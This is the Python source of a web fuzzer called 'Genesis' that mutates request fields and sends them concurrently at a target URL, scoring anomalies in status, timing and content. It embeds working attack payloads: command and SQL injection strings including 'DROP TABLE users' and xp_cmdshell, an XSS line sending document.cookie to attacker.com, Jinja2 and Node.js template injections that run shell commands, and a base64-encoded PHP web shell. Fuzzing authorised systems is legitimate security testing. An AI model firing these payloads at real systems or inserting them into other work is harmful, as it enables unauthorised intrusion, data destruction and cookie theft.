# tools/genesis_fuzzer.py
# --- VERSION 8.0 - Genesis Protocol Fuzzer with Evolutionary Mutations ---
"""
The "Genesis" Protocol Fuzzer - Evolutionary Genetic Mutation Engine.

Implements an advanced fuzzer using:
    1. Genetic Mutation Fuzzing - Byte-level mutations with feedback loops
    2. Differential Analysis - Levenshtein distance, timing, and structure analysis
    3. Context Awareness - Technology-specific mutation strategies

Instead of relying on static payloads, Genesis takes valid requests and applies
intelligent mutations to discover zero-day vulnerabilities.

Features:
    - 7+ mutation strategies (overflow, format string, unicode, etc.)
    - Technology fingerprinting for context-aware payloads
    - Statistical anomaly detection for blind vulnerability discovery
    - Baseline capture and differential response analysis
"""

import random
import string
import re
import asyncio
import aiohttp
import logging
import statistics
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from collections import Counter

logger = logging.getLogger(__name__)


def levenshtein_distance(s1: str, s2: str) -> int:
    """
    Calculate Levenshtein distance between two strings.
    Used to detect subtle differences in error messages.
    
    Args:
        s1: First string
        s2: Second string
    
    Returns:
        Levenshtein distance (number of edits needed)
    """
    if len(s1) < len(s2):
        return levenshtein_distance(s2, s1)
    
    if len(s2) == 0:
        return len(s1)
    
    previous_row = range(len(s2) + 1)
    for i, c1 in enumerate(s1):
        current_row = [i + 1]
        for j, c2 in enumerate(s2):
            # Cost of insertions, deletions, or substitutions
            insertions = previous_row[j + 1] + 1
            deletions = current_row[j] + 1
            substitutions = previous_row[j] + (c1 != c2)
            current_row.append(min(insertions, deletions, substitutions))
        previous_row = current_row
    
    return previous_row[-1]


class GenesisFuzzer:
    """
    Evolutionary Genetic Mutation Fuzzer with Differential Analysis.
    
    Key improvements over static payload scanners:
        1. Takes valid requests and applies byte-level mutations
        2. Uses feedback loop to identify successful mutation patterns
        3. Performs differential analysis to detect subtle vulnerabilities
        4. Context-aware mutations based on detected technology stack
    
    Attributes:
        mutation_strategies: List of mutation strategy functions.
        grammar: Protocol grammar definition for smart mutations.
        max_mutations_per_field: Maximum mutations to generate per field.
        baseline_response: Baseline response for differential analysis.
        tech_patterns: Patterns for detecting technology stacks.
        tech_specific_mutations: Technology-specific mutation strategies.
        successful_mutations: History of mutations that found anomalies.
        mutation_effectiveness: Tracking mutation strategy effectiveness.
    """
    
    def __init__(self):
        """Initialize the Genesis fuzzer with evolutionary mutation strategies."""
        self.mutation_strategies = [
            self._bit_flip,
            self._integer_overflow,
            self._format_string_injection,
            self._boundary_violation,
            self._unicode_injection,
            self._null_byte_injection,
            self._command_injection
        ]
        self.grammar: Dict = {}
        self.max_mutations_per_field = 50
        
        # Baseline response tracking for differential analysis
        self.baseline_response: Optional[Dict[str, Any]] = None
        
        # Technology detection patterns
        self.tech_patterns = {
            'flask': ['Flask', 'Jinja2', 'Werkzeug'],
            'django': ['Django', 'csrftoken'],
            'express': ['Express', 'X-Powered-By: Express'],
            'rails': ['Ruby on Rails', 'Rails'],
            'spring': ['Spring', 'Tomcat'],
            'asp.net': ['ASP.NET', 'X-AspNet-Version'],
            'php': ['PHP', 'X-Powered-By: PHP']
        }
        
        # Technology-specific mutation strategies
        self.tech_specific_mutations = {
            'flask': self._jinja2_injection,
            'django': self._django_template_injection,
            'express': self._nodejs_injection,
            'php': self._php_injection
        }
        
        # Feedback loop: track successful mutation patterns
        self.successful_mutations: List[Dict] = []
        self.mutation_effectiveness: Dict[str, int] = {}
        
        logger.info("🧬 GenesisFuzzer initialized with evolutionary mutation engine")
        
    def compile_grammar(self, llm_grammar_definition: Dict) -> None:
        """
        Accepts a JSON schema from the LLM defining the target protocol.
        
        The grammar definition helps Genesis understand the expected structure
        of inputs, enabling smarter mutations that are more likely to find
        vulnerabilities.
        
        Args:
            llm_grammar_definition: Dictionary defining protocol structure.
                Example::
                
                    {
                        "username": {"type": "string", "max_len": 20},
                        "age": {"type": "integer", "min": 0, "max": 120},
                        "email": {"type": "email"}
                    }
        """
        self.grammar = llm_grammar_definition
        logger.info(f"🧬 Compiled grammar with {len(self.grammar)} fields")
    
    def _bit_flip(self, base_val: Any) -> List[Any]:
        """
        Bit flip mutations for binary protocols.
        
        Args:
            base_val: Base integer value to mutate.
            
        Returns:
            List[Any]: List of mutated values with flipped bits.
        """
        if isinstance(base_val, int):
            return [base_val ^ 1, base_val ^ 0xFF, base_val ^ 0xFFFF]
        return []
    
    def _integer_overflow(self, base_val: Any) -> List[Any]:
        """
        Smart integer edge cases for overflow/underflow detection.
        
        Generates values at boundary conditions for 8/16/32/64-bit
        integers in both signed and unsigned representations.
        
        Args:
            base_val: Base value (ignored, returns static edge cases).
            
        Returns:
            List[Any]: List of integer boundary values.
        """
        return [
            0,                      # Zero
            -1,                     # Negative one
            1,                      # One
            255,                    # 8-bit max (unsigned)
            256,                    # 8-bit overflow
            -128,                   # 8-bit min (signed)
            127,                    # 8-bit max (signed)
            65535,                  # 16-bit max (unsigned)
            65536,                  # 16-bit overflow
            -32768,                 # 16-bit min (signed)
            32767,                  # 16-bit max (signed)
            2147483647,             # 32-bit max (signed)
            2147483648,             # 32-bit overflow
            -2147483648,            # 32-bit min (signed)
            4294967295,             # 32-bit max (unsigned)
            9223372036854775807,    # 64-bit max (signed)
            -9223372036854775808,   # 64-bit min (signed)
            99999999999999999,      # Large number
        ]
    
    def _format_string_injection(self, base_str):
        """Format string vulnerability probes"""
        return [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%p%p%p%p%p%p%p%p%p%p",
            "%.1000d",
            "%1000000s",
            "%0d",
            "%s" * 100,
        ]
    
    def _boundary_violation(self, base_str):
        """Buffer overflow and boundary probing"""
        return [
            "A" * 10,               # Small buffer
            "A" * 100,              # Medium buffer
            "A" * 1000,             # Large buffer
            "A" * 5000,             # Very large buffer
            "A" * 10000,            # Huge buffer
            "A" * 65535,            # Max 16-bit buffer
            "%n" * 10,              # Format string repeats
            "{{7*7}}" * 10,         # Template injection
            "${7*7}" * 10,          # Alternative template
        ]
    
    def _unicode_injection(self, base_str):
        """Unicode and encoding edge cases"""
        return [
            "\u0000",               # Null character
            "\uFFFD",               # Replacement character
            "\u202E",               # Right-to-left override
            "\u200B",               # Zero-width space
            "﷽",                    # Bismillah symbol (longest single char)
            "𝕳𝖊𝖑𝖑𝖔",              # Mathematical alphanumeric
            "™",                    # Special symbols
            "../../etc/passwd",     # Path traversal
            "..\\..\\windows\\system32",
        ]
    
    def _null_byte_injection(self, base_str):
        """Null byte and termination character injection"""
        return [
            base_str + "\x00",
            base_str + "\x00.jpg",
            base_str + "%00",
            base_str + "\x00\x00\x00",
            "\x00" + base_str,
        ]
    
    def _command_injection(self, base_str):
        """
        Command injection and code execution patterns.
        
        NOTE: These payloads contain system commands for testing purposes.
        In production environments, these should be used only on authorized targets
        with explicit permission. The commands (id, whoami, ls) are chosen to be
        relatively safe and non-destructive for testing.
        """
        return [
            "'; exec('ls'); --",
            "'; system('id'); --",
            "| whoami",
            "; cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& dir",
            "|| ls -la",
            "; ping -c 1 127.0.0.1",
            "';SELECT SLEEP(5)--",
            "') OR '1'='1",
            "admin' --",
            "' OR 1=1--",
            "1' AND 1=0 UNION ALL SELECT 'admin', 'pass'--",
        ]
    
    def _sql_injection(self, base_str):
        """SQL injection patterns"""
        return [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "admin'--",
            "1' OR '1' = '1",
            "' UNION SELECT NULL--",
            "1' AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables--",
            "'; EXEC xp_cmdshell('dir'); --",
            "' WAITFOR DELAY '00:00:05'--",
        ]
    
    def _xss_injection(self, base_str):
        """Cross-site scripting patterns"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
        ]
    
    def _jinja2_injection(self, base_str):
        """Jinja2 template injection patterns for Flask/Python"""
        return [
            "{{7*7}}",
            "{{config}}",
            "{{config.items()}}",
            "{{request.environ}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{lipsum.__globals__}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}",
        ]
    
    def _django_template_injection(self, base_str):
        """Django template injection patterns"""
        return [
            "{{settings.SECRET_KEY}}",
            "{%debug%}",
            "{{request}}",
            "{{request.META}}",
            "{%load module%}",
        ]
    
    def _nodejs_injection(self, base_str):
        """Node.js/Express specific injection patterns"""
        return [
            "__proto__",
            "constructor.prototype",
            "constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()",
            {"__proto__": {"polluted": "true"}},  # Prototype pollution
        ]
    
    def _php_injection(self, base_str):
        """PHP specific injection patterns"""
        return [
            "<?php system('id'); ?>",
            "<?= system('whoami') ?>",
            "php://filter/convert.base64-encode/resource=index.php",
            "expect://whoami",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        ]
    
    def _byte_level_mutation(self, base_val: Any) -> List[Any]:
        """
        Byte-level mutations - the core of genetic fuzzing.
        Takes a valid input and applies random byte modifications.
        
        Args:
            base_val: Base value to mutate
        
        Returns:
            List of mutated values
        """
        mutations = []
        
        if isinstance(base_val, str):
            val_bytes = base_val.encode('utf-8', errors='ignore')
            
            # Bit flip mutations
            for i in range(min(len(val_bytes), 10)):  # Limit to first 10 bytes
                mutated = bytearray(val_bytes)
                mutated[i] ^= 0xFF  # Flip all bits
                try:
                    mutations.append(mutated.decode('utf-8', errors='ignore'))
                except (UnicodeDecodeError, AttributeError):
                    pass
            
            # Random byte insertion
            for i in range(min(len(val_bytes), 5)):
                mutated = bytearray(val_bytes)
                mutated.insert(i, random.randint(0, 255))
                try:
                    mutations.append(mutated.decode('utf-8', errors='ignore'))
                except (UnicodeDecodeError, AttributeError):
                    pass
            
            # Random byte deletion
            if len(val_bytes) > 1:
                for i in range(min(len(val_bytes), 5)):
                    mutated = bytearray(val_bytes)
                    del mutated[i]
                    try:
                        mutations.append(mutated.decode('utf-8', errors='ignore'))
                    except (UnicodeDecodeError, AttributeError):
                        pass
        
        return mutations
    
    def detect_technology(self, headers: Dict[str, str], response_body: str = "") -> List[str]:
        """
        Detect technology stack from HTTP headers and response.
        
        Args:
            headers: HTTP response headers
            response_body: HTTP response body
        
        Returns:
            List of detected technologies
        """
        detected = []
        
        # Combine headers and body for pattern matching
        content = str(headers) + response_body[:1000]  # First 1KB of body
        
        for tech, patterns in self.tech_patterns.items():
            for pattern in patterns:
                if pattern.lower() in content.lower():
                    detected.append(tech)
                    logger.info(f"[Genesis] Detected technology: {tech}")
                    break
        
        return detected
    
    async def capture_baseline(
        self,
        url: str,
        method: str = "GET",
        headers: Dict[str, str] = None,
        data: Any = None,
        timeout: int = 5
    ) -> Optional[Dict[str, Any]]:
        """
        Capture baseline response for differential analysis.
        
        This is the "normal" response that we'll compare all mutations against.
        
        Args:
            url: Target URL
            method: HTTP method
            headers: HTTP headers
            data: Request data
            timeout: Request timeout
        
        Returns:
            Baseline response dictionary
        """
        logger.info(f"[Genesis] Capturing baseline response from {url}")
        
        timeout_config = aiohttp.ClientTimeout(total=timeout)
        
        try:
            async with aiohttp.ClientSession(timeout=timeout_config, headers=headers or {}) as session:
                start_time = asyncio.get_event_loop().time()
                
                if method.upper() == "GET":
                    async with session.get(url, ssl=False) as response:
                        content = await response.text()
                        elapsed = asyncio.get_event_loop().time() - start_time
                        
                        self.baseline_response = {
                            "status_code": response.status,
                            "content": content,
                            "content_length": len(content),
                            "response_time": elapsed,
                            "headers": dict(response.headers)
                        }
                else:
                    kwargs = {"ssl": False}
                    if isinstance(data, dict):
                        kwargs["json"] = data
                    elif isinstance(data, str):
                        kwargs["data"] = data
                    
                    async with session.request(method.upper(), url, **kwargs) as response:
                        content = await response.text()
                        elapsed = asyncio.get_event_loop().time() - start_time
                        
                        self.baseline_response = {
                            "status_code": response.status,
                            "content": content,
                            "content_length": len(content),
                            "response_time": elapsed,
                            "headers": dict(response.headers)
                        }
                
                logger.info(f"[Genesis] Baseline captured: {self.baseline_response['status_code']}, "
                          f"{self.baseline_response['content_length']} bytes, "
                          f"{self.baseline_response['response_time']:.3f}s")
                
                return self.baseline_response
                
        except Exception as e:
            logger.error(f"[Genesis] Failed to capture baseline: {e}")
            return None
    
    def differential_analysis(
        self,
        attack_response: Dict[str, Any],
        baseline: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        Perform differential analysis between attack response and baseline.
        
        Uses three key techniques:
        1. Levenshtein Distance - Detect subtle error message changes
        2. Timing Analysis - Detect Blind SQLi or ReDoS
        3. Structure Analysis - Detect JSON key disappearance
        
        Args:
            attack_response: Response from mutation attack
            baseline: Baseline response (uses self.baseline_response if not provided)
        
        Returns:
            Analysis results with anomaly indicators
        """
        if baseline is None:
            baseline = self.baseline_response
        
        if baseline is None:
            logger.warning("[Genesis] No baseline available for differential analysis")
            return {"has_anomaly": False, "reason": "No baseline"}
        
        findings = []
        severity = 0
        
        # 1. LEVENSHTEIN DISTANCE - Detect subtle error message changes
        baseline_content = baseline.get("content", "")
        attack_content = attack_response.get("content", "")
        
        # Only compare if responses are reasonably sized (avoid huge diffs)
        if len(baseline_content) < 50000 and len(attack_content) < 50000:
            distance = levenshtein_distance(
                baseline_content[:1000],  # Compare first 1KB
                attack_content[:1000]
            )
            
            # Normalize by length
            max_len = max(len(baseline_content[:1000]), len(attack_content[:1000]))
            if max_len > 0:
                similarity = 1 - (distance / max_len)
                
                # If response changed significantly (< 70% similar)
                if similarity < 0.7:
                    findings.append({
                        "type": "content_diff_levenshtein",
                        "severity": "MEDIUM",
                        "description": f"Response content differs significantly (similarity: {similarity:.2%})",
                        "indicator": "Possible error message exposure or state change"
                    })
                    severity += 30
                
                # If response changed slightly (70-95% similar) - subtle changes
                elif similarity < 0.95:
                    findings.append({
                        "type": "subtle_content_change",
                        "severity": "LOW",
                        "description": f"Subtle content change detected (similarity: {similarity:.2%})",
                        "indicator": "Minor response variation - may indicate edge case"
                    })
                    severity += 10
        
        # 2. TIMING ANALYSIS - Detect Blind SQLi or ReDoS
        baseline_time = baseline.get("response_time", 0)
        attack_time = attack_response.get("response_time", 0)
        
        # If attack response is significantly slower (>5x or >3 seconds longer)
        time_diff = attack_time - baseline_time
        if attack_time > baseline_time * 5 or time_diff > 3.0:
            findings.append({
                "type": "timing_anomaly",
                "severity": "HIGH",
                "description": f"Response time: {attack_time:.2f}s vs baseline {baseline_time:.2f}s (diff: {time_diff:.2f}s)",
                "indicator": "STRONG indicator of Blind SQLi, ReDoS, or resource exhaustion"
            })
            severity += 50
        elif attack_time > baseline_time * 2:
            findings.append({
                "type": "timing_variation",
                "severity": "MEDIUM",
                "description": f"Response time doubled: {attack_time:.2f}s vs {baseline_time:.2f}s",
                "indicator": "Possible timing-based vulnerability"
            })
            severity += 25
        
        # 3. STRUCTURE ANALYSIS - Detect JSON key disappearance or structure changes
        try:
            import json
            
            # Try to parse both as JSON
            baseline_json = None
            attack_json = None
            
            try:
                baseline_json = json.loads(baseline_content)
            except (json.JSONDecodeError, ValueError):
                pass
            
            try:
                attack_json = json.loads(attack_content)
            except (json.JSONDecodeError, ValueError):
                pass
            
            # If both are JSON, compare structures
            if baseline_json and attack_json:
                baseline_keys = set(str(k) for k in self._extract_json_keys(baseline_json))
                attack_keys = set(str(k) for k in self._extract_json_keys(attack_json))
                
                missing_keys = baseline_keys - attack_keys
                new_keys = attack_keys - baseline_keys
                
                if missing_keys:
                    findings.append({
                        "type": "json_key_disappearance",
                        "severity": "HIGH",
                        "description": f"JSON keys disappeared: {list(missing_keys)[:5]}",
                        "indicator": "Possible internal server error or data corruption"
                    })
                    severity += 40
                
                if new_keys:
                    findings.append({
                        "type": "json_key_appearance",
                        "severity": "MEDIUM",
                        "description": f"New JSON keys appeared: {list(new_keys)[:5]}",
                        "indicator": "Response structure changed - possible error object"
                    })
                    severity += 20
            
            # If baseline was JSON but attack is not
            elif baseline_json and not attack_json:
                findings.append({
                    "type": "json_format_break",
                    "severity": "CRITICAL",
                    "description": "Response changed from JSON to non-JSON",
                    "indicator": "STRONG indicator of server error or injection success"
                })
                severity += 60
        
        except Exception as e:
            logger.debug(f"[Genesis] Structure analysis error: {e}")
        
        # 4. STATUS CODE ANALYSIS
        baseline_status = baseline.get("status_code", 200)
        attack_status = attack_response.get("status_code", 200)
        
        if baseline_status != attack_status:
            findings.append({
                "type": "status_code_change",
                "severity": "MEDIUM",
                "description": f"Status code changed: {baseline_status} -> {attack_status}",
                "indicator": "Request handling changed"
            })
            severity += 20
        
        has_anomaly = severity >= 20  # Threshold for anomaly
        
        return {
            "has_anomaly": has_anomaly,
            "severity_score": min(severity, 100),  # Cap at 100
            "findings": findings,
            "baseline_time": baseline_time,
            "attack_time": attack_time,
            "time_diff": time_diff if 'time_diff' in locals() else 0
        }
    
    def _extract_json_keys(self, obj: Any, prefix: str = "") -> List[str]:
        """
        Recursively extract all keys from a JSON object.
        
        Args:
            obj: JSON object (dict, list, or primitive)
            prefix: Key prefix for nested objects
        
        Returns:
            List of all keys in the object
        """
        keys = []
        
        if isinstance(obj, dict):
            for k, v in obj.items():
                full_key = f"{prefix}.{k}" if prefix else k
                keys.append(full_key)
                keys.extend(self._extract_json_keys(v, full_key))
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                keys.extend(self._extract_json_keys(item, f"{prefix}[{i}]"))
        
        return keys
    
    def generate_mutations(self, payload_template: dict, detected_tech: List[str] = None) -> List[Dict]:
        """
        Generates smart variants of a request based on grammar rules and detected technology.
        NOW WITH CONTEXT AWARENESS AND BYTE-LEVEL MUTATIONS.
        
        Args:
            payload_template: Dictionary with fields and their base values
                Example: {"username": "admin", "age": 25}
            detected_tech: List of detected technologies for context-aware mutations
        
        Returns:
            List of mutated payloads
        """
        mutations = []
        detected_tech = detected_tech or []
        
        for field, base_value in payload_template.items():
            # Get field rules from grammar if available
            field_rules = self.grammar.get(field, {"type": "string"})
            field_type = field_rules.get("type", "string")
            
            # Generate mutations based on field type
            if field_type == "integer":
                for mutated_val in self._integer_overflow(base_value):
                    variant = payload_template.copy()
                    variant[field] = mutated_val
                    mutations.append(variant)
            
            elif field_type == "string":
                # CONTEXT-AWARE MUTATIONS: Add technology-specific mutations first
                strategies = []
                
                # Add tech-specific mutations if technology detected
                for tech in detected_tech:
                    if tech in self.tech_specific_mutations:
                        strategies.append(self.tech_specific_mutations[tech])
                        logger.info(f"[Genesis] Using {tech}-specific mutations for field '{field}'")
                
                # Add standard mutation strategies
                strategies.extend([
                    self._boundary_violation,
                    self._format_string_injection,
                    self._unicode_injection,
                    self._null_byte_injection,
                    self._command_injection,
                    self._sql_injection,
                    self._xss_injection
                ])
                
                # BYTE-LEVEL MUTATIONS: Add genetic mutations
                byte_mutations = self._byte_level_mutation(base_value)
                for mutated_val in byte_mutations[:10]:  # Limit to 10 byte mutations
                    variant = payload_template.copy()
                    variant[field] = mutated_val
                    mutations.append(variant)
                
                # Apply strategy-based mutations
                for strategy in strategies:
                    try:
                        strategy_mutations = strategy(str(base_value))
                        for mutated_val in strategy_mutations[:5]:  # Limit per strategy
                            variant = payload_template.copy()
                            variant[field] = mutated_val
                            mutations.append(variant)
                    except (AttributeError, TypeError, ValueError, KeyError) as e:
                        logger.debug(f"[Genesis] Strategy {strategy.__name__} failed: {e}")
                        continue
            
            elif field_type == "boolean":
                for mutated_val in [True, False, "true", "false", 1, 0, "1", "0", None]:
                    variant = payload_template.copy()
                    variant[field] = mutated_val
                    mutations.append(variant)
        
        logger.info(f"[Genesis] Generated {len(mutations)} context-aware mutations from template")
        return mutations[:1000]  # Cap at 1000 mutations to avoid resource exhaustion
    
    async def fuzz_endpoint(
        self, 
        url: str, 
        method: str = "POST", 
        grammar: dict = None,
        base_payload: dict = None,
        headers: dict = None,
        timeout: int = 5
    ) -> Dict[str, Any]:
        """
        The 'Zero-Day' Loop:
        1. Generate mutations
        2. Hammer endpoint with concurrent requests
        3. Analyze response time/size for 'blind' deviations
        
        Args:
            url: Target endpoint URL
            method: HTTP method (GET, POST, PUT, etc.)
            grammar: Grammar definition for the protocol
            base_payload: Base payload to mutate
            headers: HTTP headers
            timeout: Request timeout in seconds
        
        Returns:
            Dictionary with fuzzing results and anomalies
        """
        if grammar:
            self.compile_grammar(grammar)
        
        if not base_payload:
            base_payload = {}
        
        # STEP 1: Capture baseline response for differential analysis
        baseline = await self.capture_baseline(url, method, headers, base_payload, timeout)
        
        # STEP 2: Detect technology stack from baseline
        detected_tech = []
        if baseline:
            detected_tech = self.detect_technology(baseline.get("headers", {}), baseline.get("content", ""))
        
        # STEP 3: Generate context-aware mutations
        mutants = self.generate_mutations(base_payload, detected_tech)
        
        logger.info(f"[*] Genesis: Deploying {len(mutants)} context-aware mutations against {url}...")
        if detected_tech:
            logger.info(f"[*] Genesis: Targeting technologies: {', '.join(detected_tech)}")
        
        # Track results for anomaly detection
        results = []
        anomalies = []
        differential_anomalies = []
        
        # Configure session with proper resource management
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=20)
        timeout_config = aiohttp.ClientTimeout(total=timeout)
        
        async with aiohttp.ClientSession(
            connector=connector, 
            timeout=timeout_config,
            headers=headers or {}
        ) as session:
            # Create tasks for concurrent fuzzing
            tasks = []
            for idx, mutant in enumerate(mutants):
                task = self._execute_mutation(session, url, method, mutant, idx)
                tasks.append(task)
            
            # Execute with concurrency control (batches of 50)
            batch_size = 50
            for i in range(0, len(tasks), batch_size):
                batch = tasks[i:i + batch_size]
                batch_results = await asyncio.gather(*batch, return_exceptions=True)
                results.extend([r for r in batch_results if not isinstance(r, Exception)])
        
        # STEP 4: Perform differential analysis on each result
        for result in results:
            if "error" not in result:
                diff_analysis = self.differential_analysis(result, baseline)
                if diff_analysis.get("has_anomaly"):
                    differential_anomalies.append({
                        **result,
                        "differential_analysis": diff_analysis
                    })
        
        # STEP 5: Analyze results for traditional anomalies
        anomalies = self._analyze_results_for_anomalies(results)
        
        # Combine differential and traditional anomalies
        all_anomalies = differential_anomalies + anomalies
        
        logger.info(f"[*] Genesis: Completed fuzzing. Found {len(differential_anomalies)} differential anomalies, "
                   f"{len(anomalies)} traditional anomalies.")
        
        return {
            "total_mutations": len(mutants),
            "successful_requests": len(results),
            "anomalies": anomalies,
            "differential_anomalies": differential_anomalies,
            "all_anomalies": all_anomalies,
            "detected_tech": detected_tech,
            "summary": self._generate_summary(results, all_anomalies)
        }
    
    async def _execute_mutation(
        self, 
        session: aiohttp.ClientSession, 
        url: str, 
        method: str, 
        payload: dict,
        idx: int
    ) -> Dict[str, Any]:
        """Execute a single mutation and track results"""
        import time
        start_time = time.time()
        
        try:
            if method.upper() == "GET":
                async with session.get(url, params=payload, ssl=False) as response:
                    content = await response.text()
                    elapsed = time.time() - start_time
                    
                    return {
                        "mutation_id": idx,
                        "payload": payload,
                        "status_code": response.status,
                        "content_length": len(content),
                        "response_time": elapsed,
                        "headers": dict(response.headers),
                        "content_preview": content[:200]
                    }
            else:  # POST, PUT, etc.
                async with session.request(
                    method.upper(), 
                    url, 
                    json=payload, 
                    ssl=False
                ) as response:
                    content = await response.text()
                    elapsed = time.time() - start_time
                    
                    return {
                        "mutation_id": idx,
                        "payload": payload,
                        "status_code": response.status,
                        "content_length": len(content),
                        "response_time": elapsed,
                        "headers": dict(response.headers),
                        "content_preview": content[:200]
                    }
        except asyncio.TimeoutError:
            return {
                "mutation_id": idx,
                "payload": payload,
                "error": "timeout",
                "response_time": time.time() - start_time
            }
        except Exception as e:
            return {
                "mutation_id": idx,
                "payload": payload,
                "error": str(e),
                "response_time": time.time() - start_time
            }
    
    def _analyze_results_for_anomalies(self, results: List[Dict]) -> List[Dict]:
        """
        Analyze results for anomalies that may indicate vulnerabilities.
        
        Anomalies include:
        - Different status codes than baseline
        - Significantly different response times (blind SQLi/RCE)
        - Different content lengths
        - Error messages in responses
        """
        if not results:
            return []
        
        anomalies = []
        
        # Calculate baseline metrics
        valid_results = [r for r in results if "error" not in r]
        if not valid_results:
            return anomalies
        
        status_codes = [r["status_code"] for r in valid_results]
        content_lengths = [r["content_length"] for r in valid_results]
        response_times = [r["response_time"] for r in valid_results]
        
        # Most common status code is the baseline
        from collections import Counter
        baseline_status = Counter(status_codes).most_common(1)[0][0] if status_codes else 200
        
        # Calculate average and std deviation for response metrics
        avg_length = sum(content_lengths) / len(content_lengths) if content_lengths else 0
        avg_time = sum(response_times) / len(response_times) if response_times else 0
        
        # Detect anomalies
        for result in valid_results:
            reasons = []
            
            # Status code deviation
            if result["status_code"] != baseline_status:
                reasons.append(f"Status code {result['status_code']} differs from baseline {baseline_status}")
            
            # Content length deviation (>50% difference)
            if avg_length > 0 and abs(result["content_length"] - avg_length) / avg_length > 0.5:
                reasons.append(f"Content length {result['content_length']} differs significantly from average {avg_length:.0f}")
            
            # Response time deviation (>300% difference - potential blind injection)
            if avg_time > 0 and result["response_time"] > avg_time * 3:
                reasons.append(f"Response time {result['response_time']:.2f}s is significantly slower than average {avg_time:.2f}s (possible blind injection)")
            
            # Check for error messages in content
            content_lower = result.get("content_preview", "").lower()
            error_keywords = ["error", "exception", "stack trace", "sql", "syntax", "fatal"]
            if any(keyword in content_lower for keyword in error_keywords):
                reasons.append("Error messages detected in response")
            
            if reasons:
                anomalies.append({
                    "mutation_id": result["mutation_id"],
                    "payload": result["payload"],
                    "status_code": result["status_code"],
                    "content_length": result["content_length"],
                    "response_time": result["response_time"],
                    "reasons": reasons,
                    "severity": self._calculate_severity(reasons)
                })
        
        # Sort by severity
        anomalies.sort(key=lambda x: x["severity"], reverse=True)
        
        return anomalies
    
    def _calculate_severity(self, reasons: List[str]) -> int:
        """Calculate severity score based on anomaly reasons"""
        severity = 0
        for reason in reasons:
            if "error message" in reason.lower():
                severity += 5
            if "blind injection" in reason.lower():
                severity += 4
            if "status code" in reason.lower():
                severity += 3
            if "content length" in reason.lower():
                severity += 2
        return severity
    
    def _generate_summary(self, results: List[Dict], anomalies: List[Dict]) -> str:
        """Generate a human-readable summary of fuzzing results"""
        total = len(results)
        errors = len([r for r in results if "error" in r])
        anomaly_count = len(anomalies)
        
        summary = f"Fuzzing Summary:\n"
        summary += f"  Total Mutations: {total}\n"
        summary += f"  Errors: {errors}\n"
        summary += f"  Anomalies Found: {anomaly_count}\n"
        
        if anomalies:
            summary += f"\nTop Anomalies:\n"
            for i, anomaly in enumerate(anomalies[:5], 1):
                summary += f"  {i}. Severity {anomaly['severity']}: {', '.join(anomaly['reasons'][:2])}\n"
        
        return summary


# Singleton instance
_genesis_fuzzer_instance = None

def get_genesis_fuzzer() -> GenesisFuzzer:
    """Get or create the singleton Genesis fuzzer instance"""
    global _genesis_fuzzer_instance
    if _genesis_fuzzer_instance is None:
        _genesis_fuzzer_instance = GenesisFuzzer()
    return _genesis_fuzzer_instance
